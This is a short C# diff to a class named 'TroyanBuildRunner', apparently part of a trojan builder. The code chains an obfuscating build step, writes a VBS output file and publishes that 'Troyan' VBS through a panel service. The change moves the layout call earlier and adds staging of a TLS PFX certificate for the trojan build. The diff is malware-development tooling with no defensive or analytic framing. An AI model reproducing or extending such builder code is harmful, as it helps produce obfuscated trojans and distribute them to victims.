@@ -15,6 +15,9 @@ public sealed class TroyanBuildRunner : ITroyanBuildRunner
 
     public void Run(string server, string packId, ServerService panelService)
     {
+        var layout = panelService.Layout();
+        panelService.StageHelphaestusTlsPfxForTroyanBuild(layout);
+
         CustomBuilder[] steps =
         {
             new BodyBuilder(TroyanBuildMode.Release, _obfuscator),
@@ -31,7 +34,6 @@ public sealed class TroyanBuildRunner : ITroyanBuildRunner
                 Console.WriteLine(line);
         }
 
-        var layout = panelService.Layout();
         _plainVbs.Write(layout);
         Console.WriteLine("VBS (_output): " + layout.TroyanOutputVbs);
         panelService.PublishTroyanVbsFromBuildOutput(layout);
